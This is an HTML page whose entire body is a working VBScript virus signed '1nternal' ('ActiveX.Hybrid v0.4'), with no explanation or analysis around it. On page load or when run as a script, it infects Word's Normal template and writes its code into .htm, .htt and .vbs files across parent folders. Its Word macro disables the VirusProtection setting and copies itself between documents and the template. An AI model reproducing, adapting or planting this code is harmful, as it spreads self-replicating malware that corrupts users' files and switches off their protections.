<html> <!--1nternal-->
<head>
<meta http-equiv="Content-Type"
content="text/html; charset=iso-8859-1">
<meta name="Author" content="1nternal">
</head>
<BODY>
<script language="VBScript"><!--
On Error Resume Next
HostType = "VBS"
HostPath = Wscript.ScriptFullName
Call InfWord
Call FindHTMVBS

Private FSO, NT, HostType, InfType, HostPath, Target, Tempfile

Private Sub FindHTMVBS()
        Set FSO = CreateObject("Scripting.FileSystemObject")
        cpath = FSO.GetParentFolderName(HostPath)
        Set folder = FSO.GetFolder(cpath)
        While folder.IsRootFolder = False
                Set folder = FSO.GetFolder(cpath)
                Set fc = folder.Files
                cpath = FSO.GetParentFolderName(cpath)
                For Each Target In fc
                        InfType = LCase(FSO.GetExtensionName(Target.Name))
                        If InfType = "html" Or InfType = "htt" Then InfType = "htm"
                        If InfType = "htm" Or InfType = "vbs" And Target.Path <> HostPath Then
                                Set fh = FSO.opentextfile(Target.Path, 1, True)
                                TestString = fh.ReadLine
                                fh.Close
                                If TestString <> "<html> <!--1nternal-->" And TestString <> "'<html> <!--1nternal-->" Then
                                        Call DoFile
                                End If
                        End If
                Next
        Wend
End Sub

Private Sub InfWord()
        Set WordObj = CreateObject("Word.Application")
        Set NT = WordObj.Templates(1).VBProject.VBComponents(1).CodeModule
        If NT.Lines(1, 1) <> "'<html> <!--1nternal-->" Then
                WordObj.Options.SaveNormalPrompt = False
                NT.DeleteLines 1, NT.CountOfLines
                NT.AddFromFile HostPath
                NT.DeleteLines 171, (NT.CountOfLines - 170)
                If HostType = "HTM" Then
                        For j = 1 To 9
                                NT.ReplaceLine j, "'" + NT.Lines(j, 1)
                        Next
                        For j = 168 To 170
                                NT.ReplaceLine j, "'" + NT.Lines(j, 1)
                        Next
                Else
                        For j = 9 To 13
                                NT.ReplaceLine j, "'" + NT.Lines(j, 1)
                        Next
                End If
        End If
        Set NT = Nothing
        WordObj.Quit
End Sub

Private Sub Window_Onload()
        Randomize
        On Error Resume Next
        If Location.protocol = "file:" And (Int((6 * Rnd) + 1) = 1) Then
                Dim FSO, folder, fc, f1, cpath
                Set FSO = CreateObject("Scripting.FileSystemObject")
                HostPath = Replace(Location.href, "file:///", "")
                HostPath = Replace(HostPath, "/", "\")
                HostType = "HTM"
                Call InfWord
                Call FindHTMVBS
                Window.Status = "ActiveX.Hybrid v0.4 /1nternal"
        End If
End Sub

Private Sub Document_Close()
        On Error Resume Next
        Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
        Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
        Options.VirusProtection = False
        Options.ConfirmConversions = False
        Options.SaveNormalPrompt = False
        If NT.Lines(1, 1) <> "'<html> <!--1nternal-->" Then
                For i = 1 To 170
                        NT.InsertLines i, AD.Lines(i, 1)
                Next
        End If
        If AD.Lines(1, 1) <> "'<html> <!--1nternal-->" Then
                For i = 1 To 170
                        AD.InsertLines i, NT.Lines(i, 1)
                Next
        End If
        HostType = "DOC"
        HostPath = "C:\Windows\Web\Afile.htm"
        If (Int((15 * Rnd) + 1) = 1) Then Call FindHTMVBS
End Sub

Private Sub DoFileFromFile()
        Set fh = FSO.opentextfile(HostPath, 1, True)
        Set ft = FSO.opentextfile(Target.Path, 2, True)
        For j = 1 To 170
                NextLine = fh.ReadLine
                If HostType = "HTM" Then
                        If InfType = "vbs" Then
                                If j < 9 Or j > 167 Then
                                        NextLine = "'" + NextLine
                                End If
                                If j > 8 And j < 14 Then
                                        NextLine = Mid(NextLine, 2)
                                End If
                        End If
                Else
                        If InfType = "htm" Then
                                If j < 9 Or j > 167 Then
                                        NextLine = Mid(NextLine, 2)
                                End If
                                If j > 8 And j < 14 Then
                                        NextLine = "'" + NextLine
                                End If
                        End If
                End If
                ft.WriteLine NextLine
        Next
        fh.Close
        ft.Close
End Sub

Private Sub DoFileFromDoc()
        Set ft = FSO.opentextfile(Target.Path, 2, True)
        For j = 1 To 170
                NextLine = NT.Lines(j, 1)
                If InfType = "htm" Then
                        If j < 9 Or j > 167 Then
                                NextLine = Mid(NextLine, 2)
                        End If
                Else
                        If j > 8 And j < 14 Then
                                NextLine = Mid(NextLine, 2)
                        End If
                End If
                ft.WriteLine NextLine
        Next
        ft.Close
End Sub

Private Sub DoFile()
        Tempfile = FSO.GetTempName
        FSO.CopyFile Target.Path, Tempfile
        If HostType = "DOC" Then
                Call DoFileFromDoc
        Else
                Call DoFileFromFile
        End If
        Set fh = FSO.opentextfile(Tempfile, 1, True)
        Set ft = FSO.opentextfile(Target.Path, 8, True)
        Do While fh.AtEndOfStream <> True
                ft.WriteLine fh.ReadLine
        Loop
        ft.Close
        fh.Close
        FSO.DeleteFile Tempfile
End Sub

--></script>
</BODY>
</HTML>
